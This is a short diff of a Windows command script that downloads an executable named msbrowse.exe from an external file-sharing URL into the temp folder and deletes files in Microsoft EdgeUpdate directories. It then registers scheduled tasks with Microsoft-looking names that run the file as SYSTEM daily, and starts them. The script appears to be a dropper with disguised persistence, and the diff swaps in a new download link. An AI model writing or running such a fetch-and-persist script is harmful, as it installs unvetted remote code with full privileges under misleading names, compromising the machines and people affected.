@@ -9,7 +9,7 @@ schtasks /Query /TN Microsoft\UAStock
 schtasks /Query /TN Microsoft\UAStockU
 schtasks /Query /TN Microsoft\UAStockD
 
-wget https://l.station307.com/LYGiXeMAeb6NC9yZ6Qa8bi/msbrowse.exe -OutFile c:\windows\temp\1.exe
+wget https://l.station307.com/6FE9yWowJsko8bXuEExBnf/msbrowse.exe -OutFile c:\windows\temp\1.exe
 
 del "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
 del "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"
@@ -45,3 +45,6 @@ schtasks /TN Microsoft\MSbrowse /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\
 schtasks /TN Microsoft\MSbrowseD /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC DAILY /f
 Echo Run
 schtasks /Run /TN Microsoft\MSbrowse
+
+
+
